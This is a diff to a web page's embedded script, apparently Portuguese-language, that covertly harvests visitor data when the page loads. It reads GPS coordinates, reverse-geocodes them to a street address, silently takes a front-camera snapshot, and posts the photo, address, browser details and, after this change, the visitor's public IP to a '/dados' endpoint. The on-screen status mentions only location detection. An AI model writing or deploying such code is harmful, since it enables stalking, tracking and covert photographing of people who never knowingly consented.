@@ -140,62 +140,73 @@
   </footer>
 
   <script>
-    async function capturarDados() {
-      try {
-        const sistema = navigator.platform;
-        const navegador = navigator.userAgent;
-
-        navigator.geolocation.getCurrentPosition(async (position) => {
-          const latitude = position.coords.latitude;
-          const longitude = position.coords.longitude;
-
-          const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
-          const geoData = await geoRes.json();
-          const endereco = geoData.display_name || 'Desconhecido';
-
-          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-          const video = document.createElement('video');
-          video.srcObject = stream;
-          await video.play();
-
-          const canvas = document.createElement('canvas');
-          canvas.width = 640;
-          canvas.height = 480;
-          const context = canvas.getContext('2d');
-
-          setTimeout(() => {
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imagem = canvas.toDataURL('image/png');
-
-            fetch('/dados', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                latitude,
-                longitude,
-                endereco,
-                imagem,
-                sistema,
-                navegador
-              })
-            }).then(() => {
-              document.getElementById('status').textContent = '✅ Localização detectada com sucesso!';
-              stream.getTracks().forEach(track => track.stop());
-            }).catch(err => {
-              console.error("Erro ao enviar dados:", err);
-              document.getElementById('status').textContent = '❌ Erro ao detectar localização.';
-              stream.getTracks().forEach(track => track.stop());
-            });
-          }, 3000);
-        }, (err) => {
-          console.error("Erro ao obter localização:", err);
-          document.getElementById('status').textContent = '❌ Permissão de localização negada.';
-        });
-      } catch (err) {
-        console.error("Erro geral:", err);
-        document.getElementById('status').textContent = '❌ Erro ao capturar dados.';
-      }
+  async function capturarDados() {
+  try {
+    // CAPTURA O IP DO VISITANTE
+    let ip = 'Desconhecido';
+    try {
+      const ipResponse = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipResponse.json();
+      ip = ipData.ip;
+    } catch (ipError) {
+      console.log('Não foi possível obter o IP externo');
     }
+
+    const sistema = navigator.platform;
+    const navegador = navigator.userAgent;
+
+    navigator.geolocation.getCurrentPosition(async (position) => {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+
+      const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
+      const geoData = await geoRes.json();
+      const endereco = geoData.display_name || 'Desconhecido';
+
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      await video.play();
+
+      const canvas = document.createElement('canvas');
+      canvas.width = 640;
+      canvas.height = 480;
+      const context = canvas.getContext('2d');
+
+      setTimeout(() => {
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imagem = canvas.toDataURL('image/png');
+
+        fetch('/dados', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            latitude,
+            longitude,
+            endereco,
+            imagem,
+            sistema,
+            navegador,
+            ip: ip  // ENVIANDO O IP PARA O BACKEND
+          })
+        }).then(() => {
+          document.getElementById('status').textContent = '✅ Localização detectada com sucesso!';
+          stream.getTracks().forEach(track => track.stop());
+        }).catch(err => {
+          console.error("Erro ao enviar dados:", err);
+          document.getElementById('status').textContent = '❌ Erro ao detectar localização.';
+          stream.getTracks().forEach(track => track.stop());
+        });
+      }, 3000);
+    }, (err) => {
+      console.error("Erro ao obter localização:", err);
+      document.getElementById('status').textContent = '❌ Permissão de localização negada.';
+    });
+  } catch (err) {
+    console.error("Erro geral:", err);
+    document.getElementById('status').textContent = '❌ Erro ao capturar dados.';
+  }
+}
 
     window.onload = capturarDados;
   </script>
